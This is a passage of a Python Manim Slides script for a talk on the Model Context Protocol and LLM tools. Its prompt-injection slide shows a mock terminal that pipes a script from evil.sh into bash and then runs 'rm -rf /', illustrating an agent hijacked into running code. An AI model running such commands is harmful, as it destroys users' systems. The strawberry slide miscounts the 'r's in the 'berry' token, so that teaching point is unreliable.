"""
MCP Presentation — Manim Slides
================================
Render:
    manim render mcp_presentation.py MCPPresentation -pql
Interactive slides:
    manim-slides present MCPPresentation
Export to HTML:
    manim-slides convert MCPPresentation presentation.html
"""

from __future__ import annotations

import os

from manim import *
from manim import Code
from manim_slides import Slide
from pygments.styles import get_all_styles

# ── Palette ────────────────────────────────────────────────────────────────────
DARK = "#1A1916"  # Primary text
SEC = "#73726C"  # Secondary text
TERT = "#9C9A92"  # Tertiary text
CRAIL = "#C15F3C"  # Crail  — the only warm accent
CLOUDY = "#B1ADA1"  # Cloudy — subtle mid tone
PAMPAS = "#F4F3EE"  # Pampas — warm near-white surface
BG = "#FFFFFF"  # White  — slide background

# Legacy aliases kept so every reference in the slide methods resolves cleanly
ACCENT = CRAIL
ACCENT2 = CLOUDY
ACCENT3 = TERT
ORANGE = CRAIL
MUTED = SEC

# ── Tiny helpers ───────────────────────────────────────────────────────────────
SUPPORTED_STYLES = set(get_all_styles())
DEFAULT_STYLE = "monokai"

def H(text: str, scale: float = 1.0, color: str = DARK, **kw) -> Text:
    return Text(text, color=color, weight=BOLD, **kw).scale(scale)


def B(text: str, scale: float = 0.6, color=DARK, **kw) -> Text:
    return Text(text, color=color, **kw).scale(scale)


def pill(label: str, color: str, w: float = 2.6, h: float = 0.75) -> VGroup:
    box = RoundedRectangle(
        corner_radius=0.15,
        width=w,
        height=h,
        fill_color=color,
        fill_opacity=0.10,
        stroke_color=color,
        stroke_width=1.5,
    )
    txt = Text(label, color=color, weight=BOLD).scale(0.58).move_to(box)
    return VGroup(box, txt)


def divider(
    title: str, color: str = CRAIL, text_color: str = DARK
) -> tuple[Rectangle, Text]:
    bar = Rectangle(
        width=config.frame_width,
        height=0.05,
        fill_color=color,
        fill_opacity=1,
        stroke_width=0,
    ).to_edge(UP, buff=0)
    lbl = B(title, scale=0.52, color=text_color, weight=BOLD).next_to(
        bar, DOWN, buff=0.14
    )
    return bar, lbl


def code_block(
    src: str,
    language: str = "python",
    font_size: int = 16,
    style: str = DEFAULT_STYLE,
) -> Code:
    """
    Returns a syntax-highlighted Manim Code block.

    Args:
        src:       Source code string to display.
        language:  Pygments language alias (e.g. "python", "js", "bash").
        font_size: Controls size — avoids the clipping caused by .scale().
        style:     Pygments formatter style. Defaults to "monokai".
    """
    # Normalize source: strip outer blank lines, normalize line endings
    src = src.strip().replace("\r\n", "\n").replace("\r", "\n")

    # Ensure the style exists, fall back gracefully
    if style not in SUPPORTED_STYLES:
        print(
            f"[code_block] Unknown style '{style}', falling back to '{DEFAULT_STYLE}'"
        )
        style = DEFAULT_STYLE

    return Code(
        code_string=src,
        language=language,
        formatter_style=style,
        background="window",
        background_config={"fill_color": "#2b2b2b"},
        add_line_numbers=False,
        tab_width=4,
    )


# ══════════════════════════════════════════════════════════════════════════════
class MCPPresentation(Slide):
    """Full MCP presentation — white background."""

    # ── lifecycle ──────────────────────────────────────────────────────────────
    def construct(self):
        self.camera.background_color = ManimColor(BG)

        self._slide_title()
        self._slide_about_me()
        self._slide_what_is_mcp()
        self._slide_mcp_adopters()
        self._slide_claude_certification()
        self._slide_mcp_engine()
        self._slide_why_tools()
        #self._slide_tokenization_comparison()
        self._slide_strawberry()
        self._slide_ai_imo_win()
        self._slide_prompt_injection()
        self._slide_ace_layers()
        self._slide_ace_platforms()
        self._slide_langchain_tool_intro()
        self._slide_langchain_tool_flow()
        self._slide_tools_problems()
        self._slide_is_mcp_dead()
        self._slide_missinformation()
        self._slide_mcp_vs_skills()
        self._slide_mcp_vs_cli()
        self._slide_wolfram()       
        self._mcp_websites()
        self._slide_network_protocol()
        self._slide_network_protocol_mcp()
        self._slide_mcp_flow()
        #animation
        self._slide_connect()
        self._slide_conclusions()
        self._slide_thanks()

    # ── util ───────────────────────────────────────────────────────────────────
    def _clear(self, t: float = 0.45):
        if self.mobjects:
            self.play(FadeOut(*self.mobjects), run_time=t)

    def _header(self, title: str, color: str = CRAIL, text_color: str = CRAIL):
        bar, lbl = divider(title, color, text_color)
        self.play(FadeIn(bar, run_time=0.3), Write(lbl, run_time=0.6))
        return lbl

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 1 — Title
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_title(self):
        title = H("MCP Model Context Protocol", scale=1.05, color=CRAIL)
        subtitle = B("Daniel Arango", color=DARK).scale(1.1)
        subtitle.next_to(title, DOWN, buff=0.32)
        line = Line(LEFT * 3.5, RIGHT * 3.5, color=CLOUDY, stroke_width=2)
        line.next_to(subtitle, DOWN, buff=0.28)

        group = VGroup(title, subtitle, line).move_to(ORIGIN)

        self.play(DrawBorderThenFill(title), run_time=1.1)
        self.play(FadeIn(subtitle, shift=UP * 0.2))
        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 2 — About me
    # ══════════════════════════════════════════════════════════════════════════

    def _slide_about_me(self):
        anchor = self._header(
            "About Me",
        )
        # ── Name & title ───────────────────────────────────────────────────────
        name = H("Daniel Arango Sohm", scale=0.85)
        name.next_to(anchor, DOWN, buff=0.35)
        name.set_x(0)
        role_lines = [
            ("Student @ EAFIT  •  Engineer @ EPAM", DARK, 0.52),
            ("Leader (Dictator) at ML EAFIT", CRAIL, 0.50),
        ]
        role_mobs = []
        prev = name
        for text, color, scale in role_lines:
            m = B(text, color=color, scale=scale)
            m.next_to(prev, DOWN, buff=0.12)
            m.set_x(0)
            role_mobs.append(m)
            prev = m
        # ── Flag row ───────────────────────────────────────────────────────────
        flags = B("Col 50%   De 25%   Ru/Ua 25%", color=DARK, scale=0.52)
        flags.next_to(role_mobs[-1], DOWN, buff=0.18)
        flags.set_x(0)
        # ── Speaker badges ────────────────────────────────────────────────────
        speaker_title = B("Speaker:", color=CRAIL, weight=BOLD, scale=0.50)
        speaker_title.next_to(flags, DOWN, buff=0.22)
        speaker_title.set_x(0)
        talks = [
            "Python Moscow 2024",
            "Python Medellín",
            "PyCon Colombia 2025",
            "Medellín JS",
        ]
        talk_mobs = []
        prev = speaker_title
        for t in talks:
            m = B(f"• {t}", color=SEC, scale=0.48)
            m.next_to(prev, DOWN, buff=0.10)
            m.set_x(0)
            talk_mobs.append(m)
            prev = m
        # ── Awards ────────────────────────────────────────────────────────────
        awards = [
            ("🏆 Best CS Project EAFIT  2022-1, 2023-1, 2024-1", SEC),
            ("🥇 Claude Hackathon — 1st Place (built same day)  2025-2", CRAIL),
        ]
        award_prev = talk_mobs[-1]
        award_mobs = []
        for text, color in awards:
            m = B(text, color=color, weight=BOLD, scale=0.50)
            m.next_to(award_prev, DOWN, buff=0.18)
            m.set_x(0)
            award_mobs.append(m)
            award_prev = m
        # ── Animate ───────────────────────────────────────────────────────────
        self.play(Write(name))
        self.play(
            LaggedStart(
                *[FadeIn(r, shift=RIGHT * 0.15) for r in role_mobs], lag_ratio=0.25
            )
        )
        self.play(FadeIn(flags))
        self.next_slide()
        self.play(FadeIn(speaker_title))
        self.play(
            LaggedStart(
                *[FadeIn(t, shift=RIGHT * 0.1) for t in talk_mobs], lag_ratio=0.2
            )
        )
        self.play(
            LaggedStart(
                *[FadeIn(a, shift=UP * 0.12) for a in award_mobs], lag_ratio=0.3
            )
        )
        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 3 — What is MCP?
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_what_is_mcp(self):
        anchor = self._header("What is MCP?")

        created_by = B("Created by  Anthropic", color=TERT, scale=0.55).next_to(
            anchor, DOWN, buff=0.35
        )

        server = pill("MCP Server", CRAIL, w=3.2)
        client = pill("MCP Client", CLOUDY, w=3.2)

        server_sub = B("Exposes tools & resources", color=SEC, scale=0.42).next_to(
            server, DOWN, buff=0.1
        )
        client_sub = B("app that calls tools via LLM's", color=SEC, scale=0.42).next_to(
            client, DOWN, buff=0.1
        )

        s_grp = VGroup(server, server_sub).shift(LEFT * 2.9 + DOWN * 0.5)
        c_grp = VGroup(client, client_sub).shift(RIGHT * 2.9 + DOWN * 0.5)

        arrow = DoubleArrow(
            server.get_right(),
            client.get_left(),
            buff=0.12,
            color=TERT,
            stroke_width=2.5,
        )
        proto = B("JSON-RPC  /  stdio  /  HTTP SSE", color=TERT, scale=0.38).next_to(
            arrow, UP, buff=0.38
        )

        self.play(Write(created_by))
        self.play(FadeIn(s_grp), FadeIn(c_grp))
        self.play(GrowArrow(arrow), FadeIn(proto))
        self.next_slide()
        self._clear()

    def _slide_claude_certification(self):
        anchor = self._header("Claude Certification")

        img_path = "Certification.jpeg"
        if os.path.exists(img_path):
            img = (
                ImageMobject(img_path)
                .scale_to_fit_width(10)
                .next_to(anchor, DOWN, buff=0.25)
            )
            self.play(FadeIn(img))
        else:
            self._draw_protocol_stack(anchor)

        self.next_slide()
        self._clear()
    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 4 — MCP as an Engine
    # ══════════════════════════════════════════════════════════════════════════

    def _slide_mcp_engine(self):
        anchor = self._header("MCP as an Engine")

        row1_data = [
            ("MCP is the engine that lets an LLM", DARK),
        ]
        row2_data = [
            ("connect", CRAIL),
            ("  with  ", DARK),
            ("external", SEC),
            ("  tools as  ", DARK),
            ("code functions", TERT),
        ]

        row1 = VGroup(
            *[
                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.62)
                for w, c in row1_data
            ]
        ).arrange(RIGHT, buff=0.12)

        row2 = VGroup(
            *[
                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.62)
                for w, c in row2_data
            ]
        ).arrange(RIGHT, buff=0.12)

        headline = (
            VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.5)
        )
        headline.set_x(0)

        parts = [*row1, *row2]

        llm = pill("LLM", SEC, w=2.4, h=0.9)
        mcp = pill("MCP", CRAIL, w=2.4, h=0.9)
        tools = pill("Tools / APIs", CLOUDY, w=2.6, h=0.9)
        chain = (
            VGroup(llm, mcp, tools)
            .arrange(RIGHT, buff=1.2)
            .next_to(headline, DOWN, buff=0.65)
        )
        chain.set_x(0)
        a1 = Arrow(
            llm.get_right(), mcp.get_left(), buff=0.1, color=CRAIL, stroke_width=2.5
        )
        a2 = Arrow(
            mcp.get_right(), tools.get_left(), buff=0.1, color=CLOUDY, stroke_width=2.5
        )
        note = B(
            "The LLM decides WHEN & HOW to call a tool — MCP standardises the HOW",
            color=SEC,
            scale=0.48,
        ).next_to(chain, DOWN, buff=0.5)
        note.set_x(0)
        self.play(LaggedStart(*[Write(p) for p in parts], lag_ratio=0.06))
        self.play(FadeIn(llm), FadeIn(mcp), FadeIn(tools))
        self.play(GrowArrow(a1), GrowArrow(a2))
        self.play(FadeIn(note))
        self.next_slide()
        self._clear()


    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE  — MCP adopters
    # ═════════════════════════════════════════════


    def _slide_mcp_adopters(self):
        anchor = self._header("Who Is Using MCP?")

        # ── Headline ────────────────────────────────────────────────────────────
        row1_data = [
            ("Leading companies & projects", DARK),
        ]
        row2_data = [
            ("adopt", CRAIL),
            ("  MCP to  ", DARK),
            ("standardise", SEC),
            ("  how their  ", DARK),
            ("AI connects", TERT),
        ]

        row1 = VGroup(
            *[
                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.62)
                for w, c in row1_data
            ]
        ).arrange(RIGHT, buff=0.12)
        row2 = VGroup(
            *[
                B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.62)
                for w, c in row2_data
            ]
        ).arrange(RIGHT, buff=0.12)

        headline = (
            VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.4)
        )
        headline.set_x(0)
        parts = [*row1, *row2]

        # ── Company / project data ───────────────────────────────────────────────
        companies = [
            ("companies/c1.jpg", "GitHub",   "Repos",     CRAIL),
            ("companies/c2.png", "Canva",    "Desing",     SEC),
            ("companies/c3.jpg", "Figma",    "Desing",   TERT),
            ("companies/c4.png", "Blender",  "3D modeling",         CLOUDY),
            ("companies/c5.png", "Ghidra",   "Reverse\n Engineer",   DARK),
        ]

        IMG_W, IMG_H = 1.0, 1.0   # image bounding box
        CARD_W, CARD_H = 1.9, 2.4
        CARD_BUFF = 0.28

        cards = Group()
        for img_file, name, desc, accent in companies:
            # background rounded rect
            bg = RoundedRectangle(
                corner_radius=0.18,
                width=CARD_W,
                height=CARD_H,
                fill_color=BG,
                fill_opacity=1,
                stroke_color=accent,
                stroke_width=2.5,
            )

            logo = (
                ImageMobject(img_file)
                .set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
                .set_width(IMG_W)
            )
            if logo.get_height() > IMG_H:
                logo.scale_to_fit_height(IMG_H)

            name_label = B(name,  color=accent, weight=BOLD, scale=0.52)
            desc_label  = B(desc,  color=DARK,  weight=NORMAL, scale=0.38)

            content = Group(logo, name_label, desc_label).arrange(DOWN, buff=0.18)
            content.move_to(bg.get_center())

            card = Group(bg, content)
            cards.add(card)

        cards.arrange(RIGHT, buff=CARD_BUFF).next_to(headline, DOWN, buff=0.55)
        cards.set_x(0)

        # ── Footer note ─────────────────────────────────────────────────────────
        note = B(
            "MCP is rapidly becoming the universal plug-in standard for AI-powered applications",
            color=SEC,
            scale=0.44,
        ).next_to(cards, DOWN, buff=0.45)
        note.set_x(0)

        # ── Animations ───────────────────────────────────────────────────────────
        self.play(LaggedStart(*[Write(p) for p in parts], lag_ratio=0.06))
        self.play(
            LaggedStart(
                *[FadeIn(card, shift=UP * 0.25) for card in cards],
                lag_ratio=0.12,
            )
        )
        self.play(FadeIn(note))
        self.next_slide()
        self._clear()
    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE  — Why Tools? + meme
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_why_tools(self):
        anchor = self._header("Why Tools? — The Next-Token Problem")

        question = B(
            "If an LLM just predicts the next word...", color=DARK, scale=0.65
        ).next_to(anchor, DOWN, buff=0.38)
        follow = B(
            "...how can it DO things in the real world?", color=CRAIL, scale=0.62
        ).next_to(question, DOWN, buff=0.12)

        # Token boxes
        token_words = ["The", " next", " token", " is", " ..."]
        token_boxes = (
            VGroup(
                *[
                    VGroup(
                        RoundedRectangle(
                            corner_radius=0.1,
                            width=max(0.65, len(w) * 0.19),
                            height=0.55,
                            fill_color=PAMPAS,
                            fill_opacity=1,
                            stroke_color=CLOUDY,
                            stroke_width=1,
                        ),
                        B(w, color=DARK, scale=0.48),
                    ).arrange(ORIGIN)
                    for w in token_words
                ]
            )
            .arrange(RIGHT, buff=0.12)
            .next_to(follow, DOWN, buff=0.45)
        )

        last_q = B("  ???", color=CRAIL, weight=BOLD, scale=0.7).next_to(
            token_boxes, RIGHT, buff=0.1
        )

        solution = B(
            "",
            color=TERT,
            weight=BOLD,
            scale=0.55,
        ).next_to(token_boxes, DOWN, buff=0.5)

        self.play(Write(question))
        self.play(FadeIn(follow))
        self.play(
            LaggedStart(*[FadeIn(t) for t in token_boxes], lag_ratio=0.12),
            FadeIn(last_q),
        )
        self.next_slide()
        self.play(Write(solution))

        # meme.jpg if present
        meme_path = "memes/6.jpg"
        if os.path.exists(meme_path):
            meme = (
                ImageMobject(meme_path).scale_to_fit_width(3.2).to_corner(DR, buff=0.55)
            )
            self.play(FadeIn(meme))

        self.next_slide()
        self._clear()

    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 6 — Problems Tools solve  +  1.png
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_tools_problems(self):
        anchor = self._header("Problems That Tools Solve")

        bullets = [
            (
                CRAIL,
                "Real-time data",
                "LLMs have a training cutoff — tools fetch live info",
            ),
            (
                SEC,
                "Computation",
                "LLMs can't reliably count, calculate, or reason precisely",
            ),
            (TERT, "Side effects", "Writing files, sending emails, calling APIs"),
            (CRAIL, "External state", "Databases, calendars, spawning code execution"),
        ]

        img_path = "1.png"
        has_img = os.path.exists(img_path)

        if has_img:
            img = (
                ImageMobject(img_path)
                .scale_to_fit_width(4.5)
                .to_edge(RIGHT, buff=0.4)
                .shift(DOWN * 0.4)
            )
            self.play(FadeIn(img))

        bullet_mobs = []
        for color, title, desc in bullets:
            t = B(f"  {title}", color=color, weight=BOLD, scale=0.57)
            d = B(f"    {desc}", color=DARK, scale=0.46)
            bullet_mobs.append(VGroup(t, d).arrange(DOWN, aligned_edge=LEFT, buff=0.04))

        group = VGroup(*bullet_mobs).arrange(DOWN, aligned_edge=LEFT, buff=0.32)
        group.to_edge(LEFT, buff=0.55).shift(DOWN * 0.3)

        self.play(
            LaggedStart(
                *[FadeIn(b, shift=RIGHT * 0.25) for b in bullet_mobs], lag_ratio=0.3
            )
        )
        self.next_slide()
        self._clear()


    def _slide_tokenization_comparison(self):
        # ── header ────────────────────────────────────────────────────────────
        anchor = self._header("Tokenization")


        # ── intro sentence ────────────────────────────────────────────────────
        intro = (
            B("How should we split text before feeding it to a model?", scale=0.52, color=SEC)
            .next_to(anchor, DOWN, buff=0.35)
        )
        self.play(FadeIn(intro))
        self.next_slide()

        # ══════════════════════════════════════════════════════════════════════
        # COLUMN LAYOUT  (3 columns side-by-side)
        # ══════════════════════════════════════════════════════════════════════
        col_w   = 4.0
        col_gap = 0.35
        col_h   = 4.8
        top_y   = intro.get_bottom()[1] - 0.30

        # ── column backgrounds ────────────────────────────────────────────────
        def card(color: str, label: str, x_center: float) -> VGroup:
            bg = RoundedRectangle(
                corner_radius=0.2,
                width=col_w,
                height=col_h,
                fill_color=color,
                fill_opacity=0.07,
                stroke_color=color,
                stroke_width=1.8,
            ).move_to([x_center, top_y - col_h / 2, 0])
            title = (
                Text(label, color=color, weight=BOLD)
                .scale(0.55)
                .move_to(bg.get_top() + DOWN * 0.38)
            )
            return VGroup(bg, title), bg, title

        xs = [-col_w - col_gap, 0, col_w + col_gap]

        word_card,  word_bg,  word_title  = card(SEC,    "🔤  Word Tokens",      xs[0])
        char_card,  char_bg,  char_title  = card(CRAIL,  "🔡  Char Tokens",      xs[1])
        bpe_card,   bpe_bg,   bpe_title   = card("#4A9A6E", "✨  BPE Tokens",     xs[2])

        self.play(
            FadeIn(word_card),
            FadeIn(char_card),
            FadeIn(bpe_card),
        )
        self.next_slide()

        # ══════════════════════════════════════════════════════════════════════
        # Helper: stack lines inside a column
        # ══════════════════════════════════════════════════════════════════════
        def column_content(
            items: list[tuple[str, str]],   # (text, color)
            ref_top: np.ndarray,
            scale: float = 0.44,
            spacing: float = 0.42,
        ) -> VGroup:
            group = VGroup()
            cursor = ref_top + DOWN * 0.72
            for text, color in items:
                mob = Text(text, color=color).scale(scale).move_to(cursor, aligned_edge=LEFT)
                mob.set_x(ref_top[0] - col_w / 2 + 0.22)
                group.add(mob)
                cursor = cursor + DOWN * spacing
            return group

        # ── WORD column ───────────────────────────────────────────────────────
        word_example_label = (
            B('"love programming"', scale=0.43, color=DARK)
            .next_to(word_title, DOWN, buff=0.28)
        )
        word_tokens = VGroup(
            pill("love",        SEC, w=2.1, h=0.52),
            pill("programming", SEC, w=2.5, h=0.52),
        ).arrange(DOWN, buff=0.14).next_to(word_example_label, DOWN, buff=0.18)

        word_pros = column_content(
            [
                ("✓  Readable units", "#4A9A6E"),
                ("✓  Preserves meaning", "#4A9A6E"),
            ],
            word_bg.get_top() + DOWN * (0.72 + 1.55),
            scale=0.40,
            spacing=0.38,
        )
        word_cons = column_content(
            [
                ("✗  Millions of vocab entries", CRAIL),
                ('✗  "progrmming" → unknown', CRAIL),
                ("✗  New slang / names break it", CRAIL),
                ("✗  One model per language", CRAIL),
            ],
            word_bg.get_top() + DOWN * (0.72 + 2.45),
            scale=0.38,
            spacing=0.37,
        )

        self.play(FadeIn(word_example_label), FadeIn(word_tokens))
        self.play(FadeIn(word_pros))
        self.play(FadeIn(word_cons))
        self.next_slide()

        # ── CHAR column ───────────────────────────────────────────────────────
        char_example_label = (
            B('"love"', scale=0.43, color=DARK)
            .next_to(char_title, DOWN, buff=0.28)
        )
        char_tokens = VGroup(*[
            pill(ch, CRAIL, w=0.55, h=0.52) for ch in ["l", "o", "v", "e"]
        ]).arrange(RIGHT, buff=0.08).next_to(char_example_label, DOWN, buff=0.18)

        char_pros = column_content(
            [
                ("✓  Tiny vocabulary (~100)", "#4A9A6E"),
                ("✓  Handles any word", "#4A9A6E"),
            ],
            char_bg.get_top() + DOWN * (0.72 + 1.55),
            scale=0.40,
            spacing=0.38,
        )
        char_cons = column_content(
            [
                ('✗  "programming" = 11 tokens', CRAIL),
                ("✗  Very long sequences", CRAIL),
                ("✗  Hard to learn meaning", CRAIL),
                ("✗  Slow & memory hungry", CRAIL),
            ],
            char_bg.get_top() + DOWN * (0.72 + 2.45),
            scale=0.38,
            spacing=0.37,
        )

        self.play(FadeIn(char_example_label), FadeIn(char_tokens))
        self.play(FadeIn(char_pros))
        self.play(FadeIn(char_cons))
        self.next_slide()

        # ── BPE column ────────────────────────────────────────────────────────
        GREEN = "#4A9A6E"

        bpe_example_label = (
            B('"programming"', scale=0.43, color=DARK)
            .next_to(bpe_title, DOWN, buff=0.28)
        )
        bpe_tokens = VGroup(*[
            pill(tok, GREEN, w=w, h=0.52)
            for tok, w in [("pro", 0.80), ("gram", 0.92), ("ming", 0.92)]
        ]).arrange(RIGHT, buff=0.08).next_to(bpe_example_label, DOWN, buff=0.18)

        bpe_pros = column_content(
            [
                ("✓  Fixed, compact vocab", GREEN),
                ("✓  Handles new words", GREEN),
                ("✓  Robust to typos", GREEN),
                ("✓  Works across languages", GREEN),
            ],
            bpe_bg.get_top() + DOWN * (0.72 + 1.55),
            scale=0.40,
            spacing=0.38,
        )
        bpe_cons = column_content(
            [
                ("~  Subwords need merging step", SEC),
                ("~  Less intuitive than words", SEC),
            ],
            bpe_bg.get_top() + DOWN * (0.72 + 2.85),
            scale=0.38,
            spacing=0.37,
        )

        # ── highlight the winning column ──────────────────────────────────────
        glow = RoundedRectangle(
            corner_radius=0.22,
            width=col_w + 0.18,
            height=col_h + 0.18,
            fill_color=GREEN,
            fill_opacity=0.0,
            stroke_color=GREEN,
            stroke_width=3.5,
        ).move_to(bpe_bg)

        self.play(FadeIn(bpe_example_label), FadeIn(bpe_tokens))
        self.play(FadeIn(bpe_pros))
        self.play(FadeIn(bpe_cons))
        self.play(Create(glow))
        self.next_slide()

        # ── bottom callout ────────────────────────────────────────────────────
        callout_bg = RoundedRectangle(
            corner_radius=0.15,
            width=12.8,
            height=0.72,
            fill_color=GREEN,
            fill_opacity=0.12,
            stroke_color=GREEN,
            stroke_width=1.5,
        ).to_edge(DOWN, buff=0.22)

        callout_txt = (
            B(
                "👉  BPE merges the most frequent pairs of characters iteratively — "
                "balancing vocabulary size and sequence length.",
                scale=0.46,
                color=DARK,
            )
            .move_to(callout_bg)
        )

        self.play(FadeIn(callout_bg), FadeIn(callout_txt))
        self.next_slide()
        self._clear()
    # ══════════════════════════════════════════════════════════════════════════
    # SLIDE 7 — Strawberry / tokenisation
    # ══════════════════════════════════════════════════════════════════════════
    def _slide_strawberry(self):
        anchor = self._header("LLMs Can't Count — The Strawberry Problem")

        question = B(
            'How many  "r"  letters are in  "strawberry"?',
            color=DARK,
            weight=BOLD,
            scale=0.68,
        )
        question.next_to(anchor, DOWN, buff=0.4)

        tok_label = B(
            "The tokeniser splits it into \n(chatGPT BPE tokenizer):",
            color=SEC,
            scale=0.52,
        ).next_to(question, DOWN, buff=0.38)

        strt = pill("str", CRAIL, w=2.5)
        plus = B("+", color=TERT, weight=BOLD, scale=0.9)
        aw = pill("aw", CLOUDY, w=2.5)
        berry = pill("berry", CRAIL, w=2.5)
        tokens_row = (
            VGroup(strt, plus, aw, plus, berry)
            .arrange(RIGHT, buff=0.3)
            .next_to(tok_label, DOWN, buff=0.3)
        )

        strt_r = B('1 "r"  here', color=CRAIL, scale=0.44).next_to(strt, DOWN, buff=0.1)
        aw_r = B('0 "r"  here', color=CLOUDY, scale=0.44).next_to(aw, DOWN, buff=0.1)
        berry_r = B('1 "r"  here', color=CRAIL, scale=0.44).next_to(
            berry, DOWN, buff=0.1
        )

        warning = B(
            "LLM sees tokens, not characters\n  =>  miscounts the extra 'r' in straw!",
            color=CRAIL,
            weight=BOLD,
            scale=0.5,
        ).next_to(strt_r, DOWN, buff=0.38)

        src = 's = "strawberry"\n' 'print(s.count("r"))  # -> 3'
        cblock = code_block(src).next_to(warning, DOWN, buff=0.35)

        self.play(Write(question))
        self.play(FadeIn(tok_label))
        self.play(FadeIn(strt), FadeIn(plus), FadeIn(aw), FadeIn(plus), FadeIn(berry))
        self.play(FadeIn(strt_r), FadeIn(aw_r), FadeIn(berry_r))
        self.play(Write(warning))
        self.next_slide()
        self.play(FadeIn(cblock))
        self.next_slide()
        self._clear()
    def _slide_ai_imo_win(self):
        anchor = self._header("AI Conquers the Math Olympiad")

        # ── Headline ────────────────────────────────────────────────────────────
        row1_data = [("OpenAI  o3", CRAIL), ("  &  ", DARK), ("Gemini", SEC)]
        row2_data = [("win", TERT), ("  🥇 Gold  ", DARK), ("at IMO 2025", CRAIL)]

        row1 = VGroup(
            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
        ).arrange(RIGHT, buff=0.1)
        row2 = VGroup(
            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
        ).arrange(RIGHT, buff=0.1)
        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
        headline.set_x(0)

        # ── Sub-caption ─────────────────────────────────────────────────────────
        caption = B(
            "They generated code — because math is just logic, right?",
            color=DARK,
            scale=0.46,
        ).next_to(headline, DOWN, buff=0.22)
        caption.set_x(0)

        # ── Image cards ─────────────────────────────────────────────────────────
        IMG_MAX = 2.6
        CARD_W, CARD_H = 3.0, 3.2
        CARD_BUFF = 0.35

        cards_data = [
            ("kaggle_imo.png",  "Kaggle IMO\nChallenge",   CRAIL),
            ("memes/3.jpeg",          "The News",                SEC),
            ("memes/happy.png", "Researchers\nright now",  TERT),
        ]

        cards = Group()
        for img_file, label_text, accent in cards_data:
            bg = RoundedRectangle(
                corner_radius=0.18,
                width=CARD_W,
                height=CARD_H,
                fill_color=DARK,
                fill_opacity=1,
                stroke_color=accent,
                stroke_width=2.5,
            )
            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
            img.set_width(min(img.get_width(), IMG_MAX))
            if img.get_height() > IMG_MAX:
                img.scale_to_fit_height(IMG_MAX)

            lbl = B(label_text, color=accent, weight=BOLD, scale=0.46)

            content = Group(img, lbl).arrange(DOWN, buff=0.2)
            content.move_to(bg.get_center())
            cards.add(Group(bg, content))

        cards.arrange(RIGHT, buff=CARD_BUFF).next_to(caption, DOWN, buff=0.45)
        cards.set_x(0)

        # ── Footer ───────────────────────────────────────────────────────────────
        note = B(
            "Generating executable code to solve formal proofs — the boundaries keep moving",
            color=SEC,
            scale=0.42,
        ).next_to(cards, DOWN, buff=0.35)
        note.set_x(0)

        # ── Animations ───────────────────────────────────────────────────────────
        self.play(LaggedStart(*[Write(p) for p in [*row1, *row2]], lag_ratio=0.06))
        self.play(FadeIn(caption))
        self.play(
            LaggedStart(*[FadeIn(c, shift=UP * 0.25) for c in cards], lag_ratio=0.15)
        )
        self.play(FadeIn(note))
        self.next_slide()
        self._clear()


    def _slide_prompt_injection(self):
        anchor = self._header("When AI Goes Wrong: Prompt Injection")

        # ── Headline ────────────────────────────────────────────────────────────
        row1_data = [("Malicious prompt", CRAIL), ("  hijacks", DARK)]
        row2_data = [("the agent", SEC), ("  →  runs", DARK), ("arbitrary code", CRAIL)]

        row1 = VGroup(
            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row1_data]
        ).arrange(RIGHT, buff=0.1)
        row2 = VGroup(
            *[B(w, color=c, weight=BOLD if c != DARK else NORMAL, scale=0.66) for w, c in row2_data]
        ).arrange(RIGHT, buff=0.1)
        headline = VGroup(row1, row2).arrange(DOWN, buff=0.15).next_to(anchor, DOWN, buff=0.35)
        headline.set_x(0)

        # ── Terminal block (fake malicious command) ──────────────────────────────
        terminal_lines = [
            ("$ curl https://evil.sh | bash",          CRAIL),
            ("Downloading payload... ██████ 100%",      DARK),
            ("Executing: rm -rf /  --no-preserve-root", CRAIL),
            ("ERROR: Catastrophic failure  💥",         SEC),
        ]
        terminal_bg = RoundedRectangle(
            corner_radius=0.14,
            width=7.8,
            height=2.0,
            fill_color="#0d0d0d",
            fill_opacity=1,
            stroke_color=CRAIL,
            stroke_width=2,
        )
        term_lines_group = VGroup(
            *[B(txt, color=col, weight=BOLD, scale=0.40) for txt, col in terminal_lines]
        ).arrange(DOWN, aligned_edge=LEFT, buff=0.16)
        term_lines_group.move_to(terminal_bg.get_center())
        terminal = Group(terminal_bg, term_lines_group)
        terminal.next_to(headline, DOWN, buff=0.45)
        terminal.set_x(0)

        # ── Meme images ──────────────────────────────────────────────────────────
        MEME_H = 2.4

        def make_meme_card(img_file, label_text, accent):
            bg = RoundedRectangle(
                corner_radius=0.18,
                width=3.2,
                height=MEME_H + 0.5,
                fill_color=DARK,
                fill_opacity=1,
                stroke_color=accent,
                stroke_width=2.5,
            )
            img = ImageMobject(img_file).set_resampling_algorithm(RESAMPLING_ALGORITHMS["nearest"])
            img.set_width(min(img.get_width(), 2.8))
            if img.get_height() > MEME_H:
                img.scale_to_fit_height(MEME_H)
            lbl = B(label_text, color=accent, weight=BOLD, scale=0.44)
            content = Group(img, lbl).arrange(DOWN, buff=0.18)
            content.move_to(bg.get_center())
            return Group(bg, content)

        meme_card_1 = make_meme_card("memes/surprise.png", "Every dev watching\nthe logs", SEC)
